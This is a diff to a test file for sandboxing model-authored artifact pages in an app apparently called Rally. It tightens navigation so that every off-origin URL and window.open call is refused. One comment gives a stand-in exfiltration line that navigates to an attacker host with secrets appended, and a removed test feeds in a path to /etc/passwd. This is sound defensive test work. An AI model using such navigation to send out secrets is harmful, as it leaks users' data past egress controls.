@@ -128,62 +128,37 @@ describe('confining a surface to its artifact', () => {
 
   it('lets the artifact navigate within its own origin', () => {
     const surface = contents();
-    const opened = vi.fn();
-    confineToArtifactOrigin(surface.stub as never, ORIGIN, opened);
+    confineToArtifactOrigin(surface.stub as never, ORIGIN);
     const event = { preventDefault: vi.fn() };
     surface.handlers.navigate?.(event, `${ORIGIN}/about`);
     expect(event.preventDefault).not.toHaveBeenCalled();
-    expect(opened).not.toHaveBeenCalled();
   });
 
-  it('hands an off-origin link to the browser rather than following it', () => {
-    // Following it would put an arbitrary site inside a Rally surface; refusing
-    // silently would read as a broken page.
+  it('refuses an off-origin navigation and hands it to nobody', () => {
+    // A URL an artifact composes is a URL model-authored code chose, and
+    // `location = "https://attacker/?" + secrets` is a navigation the CSP's
+    // connect-src and form-action do not touch. Opening it externally would
+    // make Rally perform the exfiltration the egress fence exists to prevent.
     const surface = contents();
-    const opened = vi.fn();
-    confineToArtifactOrigin(surface.stub as never, ORIGIN, opened);
-    const event = { preventDefault: vi.fn() };
-    surface.handlers.navigate?.(event, 'https://example.com/docs');
-    expect(event.preventDefault).toHaveBeenCalled();
-    expect(opened).toHaveBeenCalledWith('https://example.com/docs');
-  });
-
-  it('never follows a navigation to another artifact or to the app', () => {
-    const surface = contents();
-    const opened = vi.fn();
-    confineToArtifactOrigin(surface.stub as never, ORIGIN, opened);
-    for (const url of [`https://other-g.${DOMAIN}/`, 'https://rallywith.ai/app']) {
+    confineToArtifactOrigin(surface.stub as never, ORIGIN);
+    for (const url of ['https://example.com/docs', `https://other-g.${DOMAIN}/`, 'https://rallywith.ai/app']) {
       const event = { preventDefault: vi.fn() };
       surface.handlers.navigate?.(event, url);
       expect(event.preventDefault, url).toHaveBeenCalled();
     }
   });
 
-  it('refuses to hand a non-web scheme to the system', () => {
-    // `file:` and custom schemes are exactly what an artifact should not be
-    // able to make the desktop open.
+  it('denies window.open outright rather than redirecting it anywhere', () => {
     const surface = contents();
-    const opened = vi.fn();
-    confineToArtifactOrigin(surface.stub as never, ORIGIN, opened);
-    const event = { preventDefault: vi.fn() };
-    surface.handlers.navigate?.(event, 'file:///etc/passwd');
-    expect(event.preventDefault).toHaveBeenCalled();
-    expect(opened).not.toHaveBeenCalled();
-  });
-
-  it('denies window.open and hands the URL to the browser instead', () => {
-    const surface = contents();
-    const opened = vi.fn();
-    confineToArtifactOrigin(surface.stub as never, ORIGIN, opened);
+    confineToArtifactOrigin(surface.stub as never, ORIGIN);
     expect(surface.openWindow('https://example.com')).toEqual({ action: 'deny' });
-    expect(opened).toHaveBeenCalledWith('https://example.com');
   });
 
   it('denies every permission request outright', () => {
     // A camera prompt that appears to come from Rally is worse than one that
     // never appears.
     const surface = contents();
-    confineToArtifactOrigin(surface.stub as never, ORIGIN, vi.fn());
+    confineToArtifactOrigin(surface.stub as never, ORIGIN);
     for (const permission of ['media', 'geolocation', 'notifications', 'clipboard-read']) {
       expect(surface.requestPermission(permission), permission).toEqual([false]);
     }
